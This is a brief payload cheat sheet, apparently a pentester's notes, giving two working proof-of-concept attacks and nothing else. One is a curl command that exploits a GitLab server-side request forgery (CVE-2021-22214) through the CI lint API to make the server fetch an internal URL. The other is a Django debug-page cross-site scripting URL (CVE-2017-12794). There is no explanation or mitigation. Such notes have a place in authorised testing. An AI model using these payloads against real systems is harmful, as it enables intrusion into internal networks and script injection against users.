Gitlab SSRF (CVE-2021-22214)

```bash
curl -s --show-error -H 'Content-Type: application/json' --data '{ "include_merged_yaml": true, "content": "include:\n remote: http://x.x.x.x/api/v1/targets?test.yml"}' https://REDACTED/api/v4/ci/lint -k
```

Django debug page XSS (CVE-2017-12794).

```bash
http://redacted/create_user/?username=<script>alert(/XSS/)</script>
```